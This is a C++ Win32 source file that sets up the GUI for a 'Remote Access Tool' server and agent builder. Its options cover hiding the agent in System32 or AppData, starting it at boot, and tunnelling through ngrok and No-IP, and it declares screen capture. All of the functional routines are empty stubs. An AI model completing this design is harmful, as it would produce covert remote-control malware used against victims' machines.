#include <iostream>
#include <thread>
#include <vector>
#include <map>
#include <mutex>
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <fstream>
#include <chrono>
#include <gdiplus.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "gdiplus.lib")

#define TCP_PORT 9999
#define UDP_PORT 8888
#define BUILDER_FILE "agent_builder.exe"

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;
SOCKET tcpServerSocket = INVALID_SOCKET;
SOCKET udpServerSocket = INVALID_SOCKET;
HWND clientList, statusLabel, terminalOutput;
HWND serverIpInput, serverPortInput, agentIpInput, agentPortInput, passwordInput;
HWND startOnStartupCheckbox, hideInComboBox, mutexInput, startButton, stopButton, buildButton;
HWND ngrokTokenInput, noipUsernameInput, noipPasswordInput, noipHostnameInput;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void logMessage(const std::string& message, COLORREF color);
void updateClientList();
void handleTCPClient(SOCKET clientSocket);
void handleUDPClient(SOCKET clientSocket);
void startTCPServer(std::string ip, int port);
void startUDPServer(std::string ip, int port);
void buildAgent(const std::string& ip, int port, const std::string& password, bool startOnStartup, const std::string& hideIn, const std::string& mutex, const std::string& ngrokToken, const std::string& noipUsername, const std::string& noipPassword, const std::string& noipHostname);
void captureScreen(SOCKET clientSocket);
void startNgrok(const std::string& token);
void startNoIP(const std::string& username, const std::string& password, const std::string& hostname);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MainWindowClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        "MainWindowClass",              // Window class
        "Remote Access Tool",           // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 800,

        NULL,       // Parent window
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            CreateWindowW(L"Static", L"Server IP:", WS_VISIBLE | WS_CHILD, 10, 10, 100, 20, hwnd, NULL, NULL, NULL);
            serverIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 10, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Server Port:", WS_VISIBLE | WS_CHILD, 10, 40, 100, 20, hwnd, NULL, NULL, NULL);
            serverPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 40, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Agent IP:", WS_VISIBLE | WS_CHILD, 10, 70, 100, 20, hwnd, NULL, NULL, NULL);
            agentIpInput = CreateWindowW(L"Edit", L"127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 70, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Agent Port:", WS_VISIBLE | WS_CHILD, 10, 100, 100, 20, hwnd, NULL, NULL, NULL);
            agentPortInput = CreateWindowW(L"Edit", L"9999", WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 100, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Password:", WS_VISIBLE | WS_CHILD, 10, 130, 100, 20, hwnd, NULL, NULL, NULL);
            passwordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 130, 150, 20, hwnd, NULL, NULL, NULL);

            startOnStartupCheckbox = CreateWindowW(L"Button", L"Start on Startup", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 10, 160, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"Hide In:", WS_VISIBLE | WS_CHILD, 10, 190, 100, 20, hwnd, NULL, NULL, NULL);
            hideInComboBox = CreateWindowW(L"ComboBox", NULL, WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST, 110, 190, 150, 20, hwnd, NULL, NULL, NULL);
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"AppData");
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"Program Files");
            SendMessage(hideInComboBox, CB_ADDSTRING, 0, (LPARAM)L"System32");
            SendMessage(hideInComboBox, CB_SETCURSEL, 0, 0);

            CreateWindowW(L"Static", L"Mutex:", WS_VISIBLE | WS_CHILD, 10, 220, 100, 20, hwnd, NULL, NULL, NULL);
            mutexInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 220, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"ngrok Token:", WS_VISIBLE | WS_CHILD, 10, 250, 100, 20, hwnd, NULL, NULL, NULL);
            ngrokTokenInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 250, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"No-IP Username:", WS_VISIBLE | WS_CHILD, 10, 280, 100, 20, hwnd, NULL, NULL, NULL);
            noipUsernameInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 280, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"No-IP Password:", WS_VISIBLE | WS_CHILD, 10, 310, 100, 20, hwnd, NULL, NULL, NULL);
            noipPasswordInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 110, 310, 150, 20, hwnd, NULL, NULL, NULL);

            CreateWindowW(L"Static", L"No-IP Hostname:", WS_VISIBLE | WS_CHILD, 10, 340, 100, 20, hwnd, NULL, NULL, NULL);
            noipHostnameInput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER, 110, 340, 150, 20, hwnd, NULL, NULL, NULL);

            startButton = CreateWindowW(L"Button", L"Start Server", WS_VISIBLE | WS_CHILD, 10, 370, 120, 30, hwnd, (HMENU)1, NULL, NULL);
            stopButton = CreateWindowW(L"Button", L"Stop Server", WS_VISIBLE | WS_CHILD, 140, 370, 120, 30, hwnd, (HMENU)2, NULL, NULL);
            buildButton = CreateWindowW(L"Button", L"Build Agent", WS_VISIBLE | WS_CHILD, 270, 370, 120, 30, hwnd, (HMENU)3, NULL, NULL);

            clientList = CreateWindowW(L"ListBox", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY, 270, 10, 200, 350, hwnd, NULL, NULL, NULL);
            terminalOutput = CreateWindowW(L"RichEdit20W", NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_READONLY, 480, 10, 300, 390, hwnd, NULL, NULL, NULL);
            
            LoadLibrary("Msftedit.dll");
            break;
        }
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) {
                char serverIp[64];
                GetWindowTextA(serverIpInput, serverIp, sizeof(serverIp));
                char serverPort[64];
                GetWindowTextA(serverPortInput, serverPort, sizeof(serverPort));
                std::thread(startTCPServer, std::string(serverIp), atoi(serverPort)).detach();
            } else if (LOWORD(wParam) == 2) {
                if (tcpServerSocket != INVALID_SOCKET) {
                    closesocket(tcpServerSocket);
                    tcpServerSocket = INVALID_SOCKET;
                }
            } else if (LOWORD(wParam) == 3) {
                char agentIp[64];
                GetWindowTextA(agentIpInput, agentIp, sizeof(agentIp));
                char agentPort[64];
                GetWindowTextA(agentPortInput, agentPort, sizeof(agentPort));
                char password[64];
                GetWindowTextA(passwordInput, password, sizeof(password));
                bool startOnStartup = SendMessage(startOnStartupCheckbox, BM_GETCHECK, 0, 0) == BST_CHECKED;
                char hideIn[64];
                GetWindowTextA(hideInComboBox, hideIn, sizeof(hideIn));
                char mutex[64];
                GetWindowTextA(mutexInput, mutex, sizeof(mutex));
                char ngrokToken[64];
                GetWindowTextA(ngrokTokenInput, ngrokToken, sizeof(ngrokToken));
                char noipUsername[64];
                GetWindowTextA(noipUsernameInput, noipUsername, sizeof(noipUsername));
                char noipPassword[64];
                GetWindowTextA(noipPasswordInput, noipPassword, sizeof(noipPassword));
                char noipHostname[64];
                GetWindowTextA(noipHostnameInput, noipHostname, sizeof(noipHostname));
                std::thread(buildAgent, std::string(agentIp), atoi(agentPort), std::string(password), startOnStartup, std::string(hideIn), std::string(mutex), std::string(ngrokToken), std::string(noipUsername), std::string(noipPassword), std::string(noipHostname)).detach();
            }
            break;
        }
        case WM_DESTROY: {
            if (tcpServerSocket != INVALID_SOCKET) {
                closesocket(tcpServerSocket);
            }
            if (udpServerSocket != INVALID_SOCKET) {
                closesocket(udpServerSocket);
            }
            WSACleanup();
            PostQuitMessage(0);
            break;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void logMessage(const std::string& message, COLORREF color) {
    // Add code to log messages to terminalOutput
}

void updateClientList() {
    // Add code to update the client list
}

void handleTCPClient(SOCKET clientSocket) {
    // Add code to handle TCP client communications
}

void handleUDPClient(SOCKET clientSocket) {
    // Add code to handle UDP client communications
}

void startTCPServer(std::string ip, int port) {
    // Add code to start the TCP server
}

void startUDPServer(std::string ip, int port) {
    // Add code to start the UDP server
}

void buildAgent(const std::string& ip, int port, const std::string& password, bool startOnStartup, const std::string& hideIn, const std::string& mutex, const std::string& ngrokToken, const std::string& noipUsername, const std::string& noipPassword, const std::string& noipHostname) {
    // Add code to build the agent executable with specified parameters
}

void captureScreen(SOCKET clientSocket) {
    // Add code to capture the screen and send it to the server
}

void startNgrok(const std::string& token) {
    // Add code to start ngrok with the given auth token
}

void startNoIP(const std::string& username, const std::string& password, const std::string& hostname) {
    // Add code to start No-IP with the given credentials and hostname
}
